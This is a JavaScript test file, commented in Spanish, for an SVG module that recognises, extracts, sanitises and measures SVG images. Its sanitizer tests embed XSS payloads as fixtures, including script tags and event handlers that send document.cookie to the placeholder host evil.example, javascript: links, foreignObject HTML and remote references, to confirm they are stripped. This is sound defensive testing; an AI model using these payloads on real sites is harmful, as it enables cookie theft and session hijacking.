import test from "node:test";
import assert from "node:assert/strict";

import {pareceSvg, extraerSvgDelTexto, sanearSvg,
        dimensionesSvg} from "./svg.js";

const SVG_CHICO = '<svg xmlns="http://www.w3.org/2000/svg" width="10" ' +
  'height="10"><circle cx="5" cy="5" r="4"/></svg>';

test("pareceSvg reconoce un documento svg completo", () => {
  assert.ok(pareceSvg(SVG_CHICO));
  assert.ok(pareceSvg(`  ${SVG_CHICO}  `), "tolera espacio alrededor");
  assert.ok(pareceSvg(`<?xml version="1.0"?>${SVG_CHICO}`), "tolera el preambulo xml");
});

test("pareceSvg rechaza lo que no es un svg de punta a punta", () => {
  assert.ok(!pareceSvg(""));
  assert.ok(!pareceSvg("hola"));
  assert.ok(!pareceSvg(`aca va un dibujo: ${SVG_CHICO}`), "prosa antes no cuenta");
  assert.ok(!pareceSvg(`${SVG_CHICO} gracias`), "prosa despues no cuenta");
  assert.ok(!pareceSvg("<svg xmlns='x'>sin cerrar"));
});

test("extraerSvgDelTexto encuentra el bloque con etiqueta svg", () => {
  const texto = "aca tenes el logo:\n```svg\n" + SVG_CHICO + "\n```\nespero que sirva";
  assert.equal(extraerSvgDelTexto(texto), SVG_CHICO);
});

test("extraerSvgDelTexto encuentra un bloque de codigo sin etiqueta si es svg", () => {
  const texto = "```\n" + SVG_CHICO + "\n```";
  assert.equal(extraerSvgDelTexto(texto), SVG_CHICO);
});

test("extraerSvgDelTexto acepta el mensaje entero si es un svg suelto, sin fences", () => {
  assert.equal(extraerSvgDelTexto(SVG_CHICO), SVG_CHICO);
});

test("extraerSvgDelTexto devuelve null cuando no hay ningun svg", () => {
  assert.equal(extraerSvgDelTexto("una respuesta normal, sin nada de codigo"), null);
  assert.equal(extraerSvgDelTexto("```js\nconsole.log(1)\n```"), null);
  assert.equal(extraerSvgDelTexto(""), null);
  assert.equal(extraerSvgDelTexto(undefined), null);
});

test("extraerSvgDelTexto no confunde un svg mencionado en medio de prosa", () => {
  const texto = `te paso el svg: ${SVG_CHICO} y despues seguimos hablando`;
  assert.equal(extraerSvgDelTexto(texto), null);
});

// --- los cuatro ataques que pide el encargo, uno por uno -------------------

test("sanearSvg saca un <script> adentro del svg", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg">' +
    '<script>window.location="https://evil.example/robo?c="+document.cookie</script>' +
    '<circle cx="5" cy="5" r="4"/></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/<script/i.test(limpio), "quedo un <script");
  assert.ok(!/evil\.example/i.test(limpio), "quedo la url del robo");
  assert.ok(/<circle/i.test(limpio), "se llevo puesto tambien el dibujo real");
});

test("sanearSvg saca un atributo onload (y onerror, onclick...)", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg" ' +
    'onload="fetch(\'https://evil.example/\'+document.cookie)">' +
    '<image href="x" onerror="alert(document.cookie)"/>' +
    '<rect onclick=alert(1) width="1" height="1"/></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/onload\s*=/i.test(limpio), "quedo el onload");
  assert.ok(!/onerror\s*=/i.test(limpio), "quedo el onerror");
  assert.ok(!/onclick\s*=/i.test(limpio), "quedo el onclick sin comillas");
  assert.ok(!/evil\.example/i.test(limpio));
});

test("sanearSvg saca un <foreignObject> con html adentro", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg">' +
    '<foreignObject width="100" height="100">' +
    '<body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)">' +
    '<script>alert(document.cookie)</script></body></foreignObject>' +
    '<circle cx="5" cy="5" r="4"/></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/foreignObject/i.test(limpio), "quedo el foreignObject");
  assert.ok(!/<script/i.test(limpio), "quedo el script de adentro");
  assert.ok(!/onload/i.test(limpio), "quedo el onload de adentro");
  assert.ok(/<circle/i.test(limpio), "se llevo puesto tambien el dibujo real");
});

test("sanearSvg saca un <use> remoto pero deja un <use> local", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg" ' +
    'xmlns:xlink="http://www.w3.org/1999/xlink">' +
    '<defs><circle id="c" cx="5" cy="5" r="4"/></defs>' +
    '<use xlink:href="https://evil.example/x.svg#pwn"/>' +
    '<use href="//evil.example/otra.svg"/>' +
    '<use href="#c"/></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/evil\.example/i.test(limpio), "quedo la referencia remota");
  assert.ok(/href\s*=\s*"#c"/.test(limpio), "se llevo puesto el use local, legitimo");
});

// --- mas variantes de los mismos cuatro, y algo de higiene extra -----------

test("sanearSvg saca javascript: colado en un href (con o sin xlink:)", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg">' +
    '<a href="javascript:alert(1)"><text>clickeame</text></a>' +
    '<a xlink:href="javascript:fetch(\'https://evil.example/\'+document.cookie)">' +
    '<text>clickeame</text></a></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/javascript:/i.test(limpio));
  assert.ok(!/evil\.example/i.test(limpio));
});

test("sanearSvg saca iframe, object, embed, link y meta si aparecen", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg">' +
    '<iframe src="https://evil.example"></iframe>' +
    '<object data="https://evil.example/x.swf"></object>' +
    '<embed src="https://evil.example/x"></embed>' +
    '<link rel="stylesheet" href="https://evil.example/x.css"/>' +
    '<meta http-equiv="refresh" content="0;url=https://evil.example"/>' +
    '<circle cx="5" cy="5" r="4"/></svg>';
  const limpio = sanearSvg(malicioso);
  for (const etiqueta of ["iframe", "object", "embed", "link", "meta"]) {
    assert.ok(!new RegExp(`<${etiqueta}\\b`, "i").test(limpio), `quedo un <${etiqueta}`);
  }
  assert.ok(!/evil\.example/i.test(limpio));
  assert.ok(/<circle/i.test(limpio));
});

test("sanearSvg no deja pasar un script escondido en un comentario", () => {
  const malicioso = '<svg xmlns="http://www.w3.org/2000/svg"><!-- --><script>' +
    'alert(1)</script><circle cx="5" cy="5" r="4"/></svg>';
  const limpio = sanearSvg(malicioso);
  assert.ok(!/<script/i.test(limpio));
  assert.ok(!/<!--/.test(limpio));
});

test("sanearSvg deja pasar un svg benigno practicamente intacto", () => {
  const benigno = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">' +
    '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/>' +
    '</linearGradient></defs>' +
    '<rect width="100" height="100" fill="url(#g)"/>' +
    '<path d="M10 10 L90 90" stroke="black"/></svg>';
  const limpio = sanearSvg(benigno);
  assert.ok(limpio.includes("<rect"));
  assert.ok(limpio.includes("<path"));
  assert.ok(limpio.includes("linearGradient"));
  assert.ok(limpio.includes('fill="url(#g)"'));
});

test("sanearSvg no explota con entradas raras", () => {
  assert.equal(sanearSvg(""), "");
  assert.equal(sanearSvg(null), "");
  assert.equal(sanearSvg(undefined), "");
});

// --- dimensionesSvg ---------------------------------------------------------

test("dimensionesSvg lee width/height cuando son numeros", () => {
  assert.deepEqual(dimensionesSvg(SVG_CHICO), {ancho: 10, alto: 10});
});

test("dimensionesSvg cae al viewBox si falta width/height", () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 180">' +
    "<rect/></svg>";
  assert.deepEqual(dimensionesSvg(svg), {ancho: 320, alto: 180});
});

test("dimensionesSvg ignora un width en porcentaje y cae al viewBox", () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" ' +
    'viewBox="0 0 4 3"><rect/></svg>';
  assert.deepEqual(dimensionesSvg(svg), {ancho: 4, alto: 3});
});

test("dimensionesSvg devuelve null si no hay ni tamano ni viewBox", () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>';
  assert.equal(dimensionesSvg(svg), null);
});

test("dimensionesSvg devuelve null si no hay ningun svg", () => {
  assert.equal(dimensionesSvg("esto no es un svg"), null);
});
